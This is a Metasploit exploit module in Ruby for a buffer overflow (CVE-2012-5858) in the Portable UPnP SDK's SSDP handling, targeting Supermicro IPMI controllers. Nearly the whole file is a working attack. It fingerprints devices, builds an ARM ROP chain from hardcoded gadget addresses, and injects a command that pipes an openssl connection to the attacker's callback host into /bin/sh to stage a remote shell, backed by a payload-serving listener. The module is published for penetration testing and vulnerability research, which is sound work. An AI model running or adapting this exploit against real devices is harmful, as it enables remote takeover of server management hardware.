##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Portable UPnP SDK unique_service_name() Remote Code Execution',
			'Description'    => %q{
					This module exploits a buffer overflow in the unique_service_name()
				function of libupnp's SSDP processor. The libupnp library is used across
				thousands of devices and is referred to as the Intel SDK for UPnP
				Devices or the Portable SDK for UPnP Devices.

				Due to size limitations on many devices, this exploit uses a separate TCP
				listener to stage the real payload.
			},
			'Author'         => [
					'hdm',                                              # Exploit dev for Supermicro IPMI
					'Alex Eubanks <endeavor[at]rainbowsandpwnies.com>', # Exploit dev for Supermicro IPMI
					'Richard Harman <richard[at]richardharman.com>'     # Binaries, system info, testing for Supermicro IPMI
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2012-5858' ],
					[ 'US-CERT-VU', '922681' ],
					[ 'URL', 'https://community.rapid7.com/community/infosec/blog/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play' ]
				],
			'Platform'       => ['unix'],
			'Arch'           => ARCH_CMD,
			'Privileged'     => true,
			'Payload'        =>
				{
#
#					# The following BadChars do not apply since we stage the payload
#					# through a secondary connection. This is just for reference.
#
#					'BadChars'  =>
#						# Bytes 0-8 are not allowed
#						[*(0..8)].pack("C*") +
#						# 0x09, 0x0a, 0x0d are allowed
#						"\x0b\x0c\x0e\x0f" +
#						# All remaining bytes up to space are restricted
#						[*(0x10..0x1f)].pack("C*") +
#						# Also not allowed
#						"\x7f\x3a" +
#						# Breaks our string quoting
#						"\x22",

					# Unlimited since we stage this over a secondary connection
					'Space'       => 8000,
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							# specific payloads vary widely by device (openssl for IPMI, etc)
						}
				},
			'Targets'        =>
				[

					[ "Automatic", { } ],

					#
					# ROP targets are difficult to represent in the hash, use callbacks instead
					#
					[ "Supermicro Onboard IPMI (X9SCL/X9SCM) Intel SDK 1.3.1", {

						# The callback handles all target-specific settings
						:callback => :target_supermicro_ipmi_131,

						# This matches any line of the SSDP M-SEARCH response
						:fingerprint =>
							/Server:\s*Linux\/2\.6\.17\.WB_WPCM450\.1\.3 UPnP\/1\.0, Intel SDK for UPnP devices\/1\.3\.1/mi

						#
						# SSDP response:
						#	Linux/2.6.17.WB_WPCM450.1.3 UPnP/1.0, Intel SDK for UPnP devices/1.3.1
						#	http://192.168.xx.xx:49152/IPMIdevicedesc.xml
						#	uuid:Upnp-IPMI-1_0-1234567890001::upnp:rootdevice

						# Approximately 35,000 of these found in the wild via critical.io scans (2013-02-03)

					} ],

					[ "Debug Target", {

						# The callback handles all target-specific settings
						:callback => :target_debug

					} ]

				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jan 29 2013'))

		register_options(
			[
				Opt::RHOST(),
				Opt::RPORT(1900),
				OptAddress.new('CBHOST', [ false, "The listener address used for staging the real payload" ]),
				OptPort.new('CBPORT', [ false, "The listener port used for staging the real payload" ])
			], self.class)
	end


	def exploit

		configure_socket

		target_info = choose_target

		unless self.respond_to?(target_info[:callback])
			print_error("Invalid target specified: no callback function defined")
			return
		end

		buffer = self.send(target_info[:callback])
		pkt =
			"M-SEARCH * HTTP/1.1\r\n" +
			"Host:239.255.255.250:1900\r\n" +
			"ST:uuid:schemas:device:" + buffer + ":end\r\n" +
			"Man:\"ssdp:discover\"\r\n" +
			"MX:3\r\n\r\n"

		print_status("Exploiting #{rhost} with target '#{target_info.name}' with #{pkt.length} bytes to port #{rport}...")

		r = udp_sock.sendto(pkt, rhost, rport, 0)

		1.upto(5) do
			::IO.select(nil, nil, nil, 1)
			break if session_created?
		end

		# No handler() support right now
	end



	# These devices are armle, run version 1.3.1 of libupnp, have random stacks, but no PIE on libc
	def target_supermicro_ipmi_131

		# Create a fixed-size buffer for the payload
		buffer = Rex::Text.rand_text_alpha(2000)

		# Place the entire buffer inside of double-quotes to take advantage of is_qdtext_char()
		buffer[0,1]     = '"'
		buffer[1999,1]  = '"'

		# Prefer CBHOST, but use LHOST, or autodetect the IP otherwise
		cbhost = datastore['CBHOST'] || datastore['LHOST'] || Rex::Socket.source_address(datastore['RHOST'])

		# Start a listener
		start_listener(true)

		# Figure out the port we picked
		cbport = self.service.getsockname[2]

		# Restart the service and use openssl to stage the real payload
		# Staged because only ~150 bytes of contiguous data are available before mangling
		cmd = "sleep 1;/bin/upnp_dev & echo; openssl s_client -quiet -host #{cbhost} -port #{cbport}|/bin/sh;exit;#"
		buffer[432, cmd.length] = cmd

		# Adjust $r3 to point from the bottom of the stack back into our buffer
		buffer[304,4] = [0x4009daf8].pack("V") #
			# 0x4009daf8:	add	r3, r3, r4, lsl #2
			# 0x4009dafc:	ldr	r0, [r3, #512]	; 0x200
			# 0x4009db00:	pop	{r4, r10, pc}

		# The offset (right-shifted by 2 ) to our command string above
		buffer[284,4] = [0xfffffe78].pack("V") #

		# Copy $r3 into $r0
		buffer[316,4] = [0x400db0ac].pack("V")
			# 0x400db0ac <_IO_wfile_underflow+1184>:	sub	r0, r3, #1
			# 0x400db0b0 <_IO_wfile_underflow+1188>:	pop	{pc}		; (ldr pc, [sp], #4)

		# Move our stack pointer down so as not to corrupt our payload
		buffer[320,4] = [0x400a5568].pack("V")
			# 0x400a5568 <__default_rt_sa_restorer_v2+5448>:	add	sp, sp, #408	; 0x198
			# 0x400a556c <__default_rt_sa_restorer_v2+5452>:	pop	{r4, r5, pc}

		# Finally return to system() with $r0 pointing to our string
		buffer[141,4] = [0x400add8c].pack("V")

		return buffer
=begin
		00008000-00029000 r-xp 00000000 08:01 709233     /bin/upnp_dev
		00031000-00032000 rwxp 00021000 08:01 709233     /bin/upnp_dev
		00032000-00055000 rwxp 00000000 00:00 0          [heap]
		40000000-40015000 r-xp 00000000 08:01 709562     /lib/ld-2.3.5.so
		40015000-40017000 rwxp 00000000 00:00 0
		4001c000-4001d000 r-xp 00014000 08:01 709562     /lib/ld-2.3.5.so
		4001d000-4001e000 rwxp 00015000 08:01 709562     /lib/ld-2.3.5.so
		4001e000-4002d000 r-xp 00000000 08:01 709535     /lib/libpthread-0.10.so
		4002d000-40034000 ---p 0000f000 08:01 709535     /lib/libpthread-0.10.so
		40034000-40035000 r-xp 0000e000 08:01 709535     /lib/libpthread-0.10.so
		40035000-40036000 rwxp 0000f000 08:01 709535     /lib/libpthread-0.10.so
		40036000-40078000 rwxp 00000000 00:00 0
		40078000-40180000 r-xp 00000000 08:01 709620     /lib/libc-2.3.5.so
		40180000-40182000 r-xp 00108000 08:01 709620     /lib/libc-2.3.5.so
		40182000-40185000 rwxp 0010a000 08:01 709620     /lib/libc-2.3.5.so
		40185000-40187000 rwxp 00000000 00:00 0
		bd600000-bd601000 ---p 00000000 00:00 0
		bd601000-bd800000 rwxp 00000000 00:00 0
		bd800000-bd801000 ---p 00000000 00:00 0
		bd801000-bda00000 rwxp 00000000 00:00 0
		bdc00000-bdc01000 ---p 00000000 00:00 0
		bdc01000-bde00000 rwxp 00000000 00:00 0
		be000000-be001000 ---p 00000000 00:00 0
		be001000-be200000 rwxp 00000000 00:00 0
		be941000-be956000 rwxp 00000000 00:00 0          [stack]
=end

	end

	# Generate a buffer that provides a starting point for exploit development
	def target_debug
		buffer = Rex::Text.pattern_create(2000)
	end

	def stage_real_payload(cli)
		print_good("Sending payload of #{payload.encoded.length} bytes to #{cli.peerhost}:#{cli.peerport}...")
		cli.put(payload.encoded + "\n")
	end

	def start_listener(ssl = false)

		comm = datastore['ListenerComm']
		if comm == "local"
			comm = ::Rex::Socket::Comm::Local
		else
			comm = nil
		end

		self.service = Rex::Socket::TcpServer.create(
			'LocalPort' => datastore['CBPORT'],
			'SSL'       => ssl,
			'SSLCert'   => datastore['SSLCert'],
			'Comm'      => comm,
			'Context'   =>
				{
					'Msf'        => framework,
					'MsfExploit' => self,
				})

		self.service.on_client_connect_proc = Proc.new { |client|
			stage_real_payload(client)
		}

		# Start the listening service
		self.service.start
	end

	#
	# Shut down any running services
	#
	def cleanup
		super
		if self.service
			print_status("Shutting down payload stager listener...")
			begin
				self.service.deref if self.service.kind_of?(Rex::Service)
				if self.service.kind_of?(Rex::Socket)
					self.service.close
					self.service.stop
				end
				self.service = nil
			rescue ::Exception
			end
		end
	end

	def choose_target
		# If the user specified a target, use that one
		return self.target unless self.target.name =~ /Automatic/

		msearch =
			"M-SEARCH * HTTP/1.1\r\n" +
			"Host:239.255.255.250:1900\r\n" +
			"ST:upnp:rootdevice\r\n" +
			"Man:\"ssdp:discover\"\r\n" +
			"MX:3\r\n\r\n"

		# Fingerprint the service through SSDP
		udp_sock.sendto(msearch, rhost, rport, 0)

		res = nil
		1.upto(5) do
			res,addr,info = udp_sock.recvfrom(65535, 1.0)
			break if res and res =~ /^(Server|Location)/mi
			udp_sock.sendto(msearch, rhost, rport, 0)
		end

		self.targets.each do |t|
			return t if t[:fingerprint] and res =~ t[:fingerprint]
		end

		if res and res.to_s.length > 0
			print_status("No target matches this fingerprint")
			print_status("")
			res.to_s.split("\n").each do |line|
				print_status("    #{line.strip}")
			end
			print_status("")
		else
			print_status("The system #{rhost} did not reply to our M-SEARCH probe")
		end

		fail_with(Exploit::Failure::NoTarget, "No compatible target detected")
	end

	# Accessor for our TCP payload stager
	attr_accessor :service

	# We need an unconnected socket because SSDP replies often come
	# from a different sent port than the one we sent to. This also
	# breaks the standard UDP mixin.
	def configure_socket
		self.udp_sock = Rex::Socket::Udp.create({
			'Context'   => { 'Msf' => framework, 'MsfExploit' => self }
		})
		add_socket(self.udp_sock)
	end

	#
	# Required since we aren't using the normal mixins
	#

	def rhost
		datastore['RHOST']
	end

	def rport
		datastore['RPORT']
	end

	# Accessor for our UDP socket
	attr_accessor :udp_sock

end
